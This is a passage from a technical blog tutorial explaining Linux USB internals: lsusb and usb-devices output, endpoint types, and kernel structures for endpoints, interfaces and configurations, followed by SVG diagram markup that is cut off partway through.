</span></span><span class="line"><span class="cl">        ID PP03:VV03 Lite-On Technology Corp. Qualcomm Atheros QCA9377 Bluetooth
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    |__ Port 5: Dev 3, If 0, Class=Wireless, Driver=btusb, 12M
</span></span><span class="line"><span class="cl">        ID PP03:VV03 Lite-On Technology Corp. Qualcomm Atheros QCA9377 Bluetooth
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    |__ Port 7: Dev 4, If 0, Class=Video, Driver=uvcvideo, 480M
</span></span><span class="line"><span class="cl">        ID PP04:VV04 Realtek Semiconductor Corp.
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    |__ Port 7: Dev 4, If 1, Class=Video, Driver=uvcvideo, 480M
</span></span><span class="line"><span class="cl">        ID PP04:VV04 Realtek Semiconductor Corp.
</span></span></code></pre></div><p>This output shows a list of USB host controllers (Bus 02 and Bus 01) and the actual physical devices connected to them. At then end of each line, the negotiated speed limits are shown in Mbits/s. There are different negotiated speeds for different kinds of devices.</p>
<ul>
<li>Full speed mode (12 Mbits/s) is used for communicating with keyboard, mice and other similar devices.</li>
<li>Hi-Speed mode (480 Mbit/s) is used for communication with storage devices, webcams, and other devices which demand more bandwidth.</li>
<li>Ports with 5000 Mbits/s (5Gbits/s) is USB 3.0 port.</li>
</ul>
<p>As the output shows, my laptop has two USB host controllers. One of them is USB3(5000 Mbits/s) and another is USB2(480 Mbits/s). Both of them are managed by <code>xhci_hcd/6p</code> and <code>xhci_hcd/12p</code> driver respectively.</p>
<p>The device numbers (Dev 1, Dev2, &hellip;) are just numbers given by kernel to identify each device. If you eject and plug the same USB you might get another device number for it.</p>
<p>Now, let&rsquo;s focus on bus #02. This bus has 3 types/class of devices connected to it:-</p>
<ol>
<li>Human Interface Device (for my keyboard and mice)</li>
<li>Wireless (for Bluetooth adapter card)</li>
<li>Video (for video camera)</li>
</ol>
<p>Each USB device contains a vendor ID and a product ID which helps programs to detect the device and load proper driver for it. To clarify, companies pay to acquire Vendor IDs from the USB Implementers Forum. A complete list of vendor IDs with their respective product ID can be found <a href="http://www.linux-usb.org/usb.ids">here</a> <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<p>USB implementation is complex by design. There are tons of things that are abstracted from the regular users&hellip; but for a kernel developer working on USB device drivers, it is very useful to know how things work beyond the simple abstraction layer.</p>
<h4 id="more-usb-info">More USB info</h4>
<p>There is some information that <code>lsusb</code> do not provide, to make things easy for end user&hellip; We can use <code>usb-devices</code> command for that stuff.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">T:  Bus=01 Lev=00 Prnt=00 Port=00 Cnt=00 Dev#=  1 Spd=480 MxCh=12
</span></span><span class="line"><span class="cl">D:  Ver= 2.00 Cls=09(hub  ) Sub=00 Prot=01 MxPS=64 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=1d6b ProdID=0002 Rev=05.18
</span></span><span class="line"><span class="cl">S:  Manufacturer=Linux 5.18.3-arch1-1 xhci-hcd
</span></span><span class="line"><span class="cl">S:  Product=xHCI Host Controller
</span></span><span class="line"><span class="cl">S:  SerialNumber=0000:00:14.0
</span></span><span class="line"><span class="cl">C:  #Ifs= 1 Cfg#= 1 Atr=e0 MxPwr=0mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=09(hub  ) Sub=00 Prot=00 Driver=hub
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   4 Ivl=256ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">T:  Bus=01 Lev=01 Prnt=01 Port=00 Cnt=01 Dev#=  5 Spd=12  MxCh= 0
</span></span><span class="line"><span class="cl">D:  Ver= 2.00 Cls=00(&gt;ifc ) Sub=00 Prot=00 MxPS= 8 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=046d ProdID=c534 Rev=29.01
</span></span><span class="line"><span class="cl">S:  Manufacturer=Logitech
</span></span><span class="line"><span class="cl">S:  Product=USB Receiver
</span></span><span class="line"><span class="cl">C:  #Ifs= 2 Cfg#= 1 Atr=a0 MxPwr=98mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=03(HID  ) Sub=01 Prot=01 Driver=usbhid
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   8 Ivl=8ms
</span></span><span class="line"><span class="cl">I:  If#= 1 Alt= 0 #EPs= 1 Cls=03(HID  ) Sub=01 Prot=02 Driver=usbhid
</span></span><span class="line"><span class="cl">E:  Ad=82(I) Atr=03(Int.) MxPS=  20 Ivl=2ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">T:  Bus=02 Lev=00 Prnt=00 Port=00 Cnt=00 Dev#=  1 Spd=5000 MxCh= 6
</span></span><span class="line"><span class="cl">D:  Ver= 3.00 Cls=09(hub  ) Sub=00 Prot=03 MxPS= 9 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=1d6b ProdID=0003 Rev=05.18
</span></span><span class="line"><span class="cl">S:  Manufacturer=Linux 5.18.3-arch1-1 xhci-hcd
</span></span><span class="line"><span class="cl">S:  Product=xHCI Host Controller
</span></span><span class="line"><span class="cl">S:  SerialNumber=0000:00:14.0
</span></span><span class="line"><span class="cl">C:  #Ifs= 1 Cfg#= 1 Atr=e0 MxPwr=0mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=09(hub  ) Sub=00 Prot=00 Driver=hub
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   4 Ivl=256ms
</span></span></code></pre></div><p>This definitely gives more information than the previous command&hellip; but it is all alien looking at first glance. Slowly, you can see that few bits are not so alien after all. We can get the <code>Bus</code>, <code>Port</code>, <code>Spd</code>(Speed), <code>Cls</code>, <code>Vendor</code>, <code>ProdID</code> from the above output as we were able to via <code>lsusb</code> command.</p>
<p>Now it&rsquo;s time to understand more about USBs and get into the abstraction layer and dig deeper.</p>
<p>Typically, USB devices uses it&rsquo;s own file-system on linux, which is a dynamically generated file-system that complements the normal device node system, and can be used to write user space device drivers. <em>Just remember that this is not always the case.</em></p>
<p>Irrespective of what the case is, you can get above output (or something similar) using multitude of tools/utilities&hellip; you can just focus on understanding the output of such tools/utilities for now.</p>
<p>The information in the above output is arranged in groups and each group has 1 character that actually indicates the <code>type</code> of the information written in that specific line. See below table for complete list:</p>
<table>
<thead>
<tr>
<th>Character</th>
<th>Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>T</td>
<td>Topology information</td>
</tr>
<tr>
<td>D</td>
<td>Device Descriptor information</td>
</tr>
<tr>
<td>P</td>
<td>Similar to D; Product info (fetched from device descriptor info</td>
</tr>
<tr>
<td>S</td>
<td>String info; returned by device</td>
</tr>
<tr>
<td>C</td>
<td>Configuration Descriptor information</td>
</tr>
<tr>
<td>I</td>
<td>Interface Descriptor information</td>
</tr>
<tr>
<td>E</td>
<td>Endpoint Descriptor information</td>
</tr>
</tbody>
</table>
<p>To get a complete understanding of the above, we need more knowledge around how USB system works inside linux kernel&hellip; Or more specifically, how usb endpoints, Interfaces and configurations all fit together in the topology.</p>
<p>According to USB protocol (standardized by USB Implementers Forum or USB-IF folks), USB is a <em>cable bus that supports data exchange between host computer and a wide range of simultaneously accessible peripherals.</em></p>
<p>USB protocol uses <em>star-topology</em> starting from a single node called &ldquo;<strong>host</strong>&rdquo; or &ldquo;<strong>root-hub</strong>&rdquo; with branches to other nodes. These nodes could be another level <strong>hub</strong> or simply a functional <strong>peripheral device</strong> (device used by user).</p>
<p>Because of this topology, USB device can never start sending data without being asked first&hellip; So it makes USB host controller in-charge of asking every USB device if it has any data to send. This allows for a very easy plug-n-play type of system, where devices can be easily configured by the host computer.</p>
<p>To remove the necessity of special drivers for different kind of devices, USB protocol specifications has defined some set of standards that any device of a specific type can follow. These types are called classes. Complete list of USB specified classes can be found <a href="https://www.usb.org/defined-class-codes">here</a> <sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> with their class codes.</p>
<p>The idea of installing drivers for each and every USB device (manually) and then rebooting the system is very scary to me. This type of specification helps a lot. Still if there are some special devices which you need to work with, then you can install the special device driver for that and it&rsquo;ll still work. It means, you get support for most kinds of USB devices by default and you can still add more support without changing anything in the design.</p>
<p>Unfortunately, USB protocol specification is a multi-layer protocol specification which makes USBs a lot more complex and abstracted than we expected. Fortunately, most of this complexity is handled by <strong>USB core subsystem</strong> <sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>.</p>
<p>Linux Device drivers (normally implemented as a loadable kernel modules) have to set up few thing before they can actually start functioning as USB devices. Few of these things involve setting up configurations, interfaces and endpoints; And then binding USB device to USB interface.</p>
<h4 id="endpoints">Endpoints</h4>
<p>Most basic form of USB communication is through <strong>endpoints</strong>. Endpoints are like pipes which carry data in a single direction (<em>a unidirectional pipe</em>) only, either from my laptop to device (<strong>OUT endpoint</strong>) or from the USB device to my laptop (<strong>IN endpoint</strong>).</p>
<p>Each endpoint has an associated <strong>DescrptorType</strong> to it which defines how the data is transmitted through that endpoint. There can be 4 different type of such descriptors:-</p>
<ol>
<li>
<p>CONTROL</p>
<ul>
<li>Normally used to configure, retrieve info, send info or get status reports about the device.</li>
<li>Every USB has a control endpoint with associated number = 0</li>
</ul>
</li>
<li>
<p>INTERRUPT</p>
<ul>
<li>transfers small amounts of data at fixed rate every time somebody asks device for data.</li>
<li>Usually used with keyboard and mice; anywhere we need to send a signal to device using buttons or similar methods.</li>
</ul>
</li>
<li>
<p>BULK</p>
<ul>
<li>Transfer larger amounts to data with no data loss.</li>
<li>Common for printer, storage and network devices.</li>
</ul>
</li>
<li>
<p>ISOCHRONOUS</p>
<ul>
<li>Also transfer large amounts of data, but data loss is possible.</li>
<li>Usually for real time devices or any constant streaming data.</li>
<li>Commonly found in audio and video devices.</li>
</ul>
</li>
</ol>
<p>In linux kernel, this is implemented using <code>struct usb_host_endpoint</code> <sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_host_endpoint</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_endpoint_descriptor</span>		<span class="n">desc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_ss_ep_comp_descriptor</span>	<span class="n">ss_ep_comp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_ssp_isoc_ep_comp_descriptor</span>	<span class="n">ssp_isoc_ep_comp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">list_head</span>		<span class="n">urb_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span>				<span class="o">*</span><span class="n">hcpriv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ep_device</span>		<span class="o">*</span><span class="n">ep_dev</span><span class="p">;</span>	<span class="cm">/* For sysfs info */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">extra</span><span class="p">;</span>   <span class="cm">/* Extra descriptors */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">extralen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">enabled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">streams</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Each endpoint has their own descriptor attached to it, which is defined with <code>struct usb_endpoint_descriptor</code> <sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup> . This structure contains the actual information provided by the device.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* USB_DT_ENDPOINT: Endpoint descriptor */</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_endpoint_descriptor</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bLength</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bDescriptorType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bEndpointAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bmAttributes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__le16</span> <span class="n">wMaxPacketSize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bInterval</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* NOTE:  these two are _only_ in audio endpoints. */</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* use USB_DT_ENDPOINT*_SIZE in bLength, not sizeof. */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bRefresh</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>  <span class="n">bSynchAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">packed</span><span class="p">));</span>
</span></span></code></pre></div><p>We can already see that there is a <code>bDescriptorType</code> variable in the <code>struct usb_endpoint_descriptor</code>. This is what defines the type of the endpoint - either <em>Control</em>, <em>Interrupt</em>, <em>Bulk</em> or <em>Isochronous</em>. Along with this, this field also contains the direction of the endpoint - either <em>IN</em> or <em>OUT</em>. The bit-masks <code>USB_DIR_OUT</code> and <code>USB_DIR_IN</code> can be placed against this field to determine the direction of the endpoint.</p>
<h4 id="interfaces">Interfaces</h4>
<p>Zero or more of such endpoints are bundled up into an <strong>Interface</strong>. These interfaces handle only one type of USB connection - such as mouse, touch-pad, keyboard, storage, video stream, etc..
USB interfaces may have alternate settings, which are different choices for parameters of the interface. In kernel, this is implemented as <code>struct usb_interface</code> <sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* array of alternate settings for this interface,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * stored in no particular order */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_host_interface</span> <span class="o">*</span><span class="n">altsetting</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_host_interface</span> <span class="o">*</span><span class="n">cur_altsetting</span><span class="p">;</span>	<span class="cm">/* the currently
</span></span></span><span class="line"><span class="cl"><span class="cm">					 * active alternate setting */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="n">num_altsetting</span><span class="p">;</span>	<span class="cm">/* number of alternate settings */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">minor</span><span class="p">;</span>			<span class="cm">/* minor number this interface is
</span></span></span><span class="line"><span class="cl"><span class="cm">					 * bound to */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">...</span> <span class="n">snip</span> <span class="n">snip</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p><code>struct usb_interface</code> is the structure which USB core passes to USB drivers and what the USB driver is then in charge of. Each <code>usb_interface</code> can have multiple settings, but only one setting will be used at a point in time. These settings are defined in another struct <code>struct usb_host_interface</code>. <sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_host_interface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_interface_descriptor</span>	<span class="n">desc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">extralen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">extra</span><span class="p">;</span>   <span class="cm">/* Extra descriptors */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* array of desc.bNumEndpoints endpoints associated with this
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * interface setting.  these will be in no particular order.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_host_endpoint</span> <span class="o">*</span><span class="n">endpoint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>		<span class="cm">/* iInterface string, if present */</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p><code>struct usb_host_interface</code> contains a <code>struct usb_host_endpoint</code> which is the USB endpoint structure we discussed above.</p>
<h4 id="configurations">Configurations</h4>
<p>One or more USB interfaces are themselves bundled in a USB configuration. A USB device can have multiple configurations and might switch between them in order to change the state of the device.</p>
<p>In linux kernel, It is defined as <code>struct usb_host_config</code> <sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_host_config</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_config_descriptor</span>	<span class="n">desc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">;</span>		<span class="cm">/* iConfiguration string, if present */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* List of any Interface Association Descriptors in this
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * configuration. */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_interface_assoc_descriptor</span> <span class="o">*</span><span class="n">intf_assoc</span><span class="p">[</span><span class="n">USB_MAXIADS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* the interfaces associated with this configuration,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * stored in no particular order */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_interface</span> <span class="o">*</span><span class="n">interface</span><span class="p">[</span><span class="n">USB_MAXINTERFACES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Interface information available even when this is not the
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * active configuration */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">usb_interface_cache</span> <span class="o">*</span><span class="n">intf_cache</span><span class="p">[</span><span class="n">USB_MAXINTERFACES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">extra</span><span class="p">;</span>   <span class="cm">/* Extra descriptors */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">extralen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Linux defines the USB configurations as above <code>struct usb_host_config</code> and the entire USB device as <code>struct usb_device</code> <sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup></p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 1048 985"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='836' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='852' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='868' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='884' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='900' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='916' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='0' y='932' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='0' y='964' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='8' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='16' y='964' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='964' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='40' y='964' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='48' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='68' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='56' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='68' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='68' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='72' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='68' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='80' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='964' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='68' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='88' y='116' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='88' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='88' y='308' fill='currentColor' style='font-size:1em'>│</text>
